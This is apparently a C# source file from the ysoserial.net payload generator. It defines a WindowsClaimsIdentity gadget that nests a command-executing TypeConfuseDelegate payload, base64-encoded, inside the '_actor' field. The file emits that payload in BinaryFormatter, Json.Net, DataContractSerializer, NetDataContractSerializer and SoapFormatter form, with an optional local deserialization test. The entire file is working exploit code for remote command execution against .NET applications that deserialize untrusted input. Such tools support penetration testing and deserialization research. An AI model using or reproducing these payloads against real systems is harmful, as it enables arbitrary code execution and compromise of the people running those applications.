using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Xml;
using Newtonsoft.Json;
using System.Runtime.Serialization.Formatters.Soap;
using Microsoft.IdentityModel.Claims;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    class WindowsClaimsIdentityGenerator : GenericGenerator
    {
        public override string Description()
        {
            return "WindowsClaimsIdentity (Microsoft.IdentityModel.Claims namespace) gadget";

            // This is similar to WindowsIdentityGenerator but based on Microsoft.IdentityModel.Claims.WindowsClaimsIdentity
            // "actor" has the same effect as "bootstrapContext" but is shorter. 
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter"};
        }

        public override string Name()
        {
            return "WindowsClaimsIdentity";
        }

        public override string Credit()
        {
            return "Soroush Dalili";
        }

        [Serializable]
        public class WindowsClaimsIdentityMarshal : ISerializable
        {
            public WindowsClaimsIdentityMarshal()
            {
                B64Payload = "";
            }

            public WindowsClaimsIdentityMarshal(string b64payload)
            {
                B64Payload = b64payload;
            }

            private string B64Payload { get; }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(typeof(WindowsClaimsIdentity));
                info.AddValue("_actor", B64Payload);
                info.AddValue("m_userToken", new IntPtr(0));
                info.AddValue("_label", null);
                info.AddValue("_nameClaimType", null);
                info.AddValue("_roleClaimType", null);
            }
        }

        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
        {
            Generator binaryFormatterGenerator = new TypeConfuseDelegateGenerator();
            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false, minify);
            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
            {
                var obj = new WindowsClaimsIdentityMarshal(b64encoded);
                return Serialize(obj, formatter, test, minify);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {
               
                string payload = @"{
                    '$type': 'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35',
                    'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                }";
               
                if (minify)
                {
                    payload = Helpers.JSONMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                }


                if (test)
                {
                    try
                    {
                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
                        {
                            TypeNameHandling = TypeNameHandling.Auto
                        });
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                
                string payload = $@"<root type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
    <WindowsClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims"">
      <System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
       </WindowsClaimsIdentity>
</root>
";

                if (minify)
                {
                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                }

                if (test)
                {
                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.LoadXml(payload);
                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                        var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {

                string payload = $@"<root>
<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <_actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</_actor>
  <m_userToken z:Type=""System.IntPtr"" z:Assembly=""0"" xmlns="""">
    <value z:Type=""System.Int64"" z:Assembly=""0"">0</value>
  </m_userToken>
  <_label i:nil=""true""/>
  <_nameClaimType i:nil=""true""/>
  <_roleClaimType i:nil=""true""/>
</w>
</root>
";

                if (minify)
                {
                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                }

                if (test)
                {
                    try
                    {
                        var xmlDoc = new XmlDocument();
                        xmlDoc.LoadXml(payload);
                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                        var s = new NetDataContractSerializer();
                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {

                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
    <a1:WindowsClaimsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/Microsoft.IdentityModel.Claims/Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
      <System.Security.ClaimsIdentity.actor xsi:type=""xsd:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
    </a1:WindowsClaimsIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";

                if (minify)
                {
                    payload = XMLMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, Helpers.FormatterType.SoapFormatter);
                }

                if (test)
                {
                    try
                    {
                        byte[] byteArray = System.Text.Encoding.ASCII.GetBytes(payload);
                        MemoryStream ms = new MemoryStream(byteArray);
                        SoapFormatter sf = new SoapFormatter();
                        sf.Deserialize(ms);
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
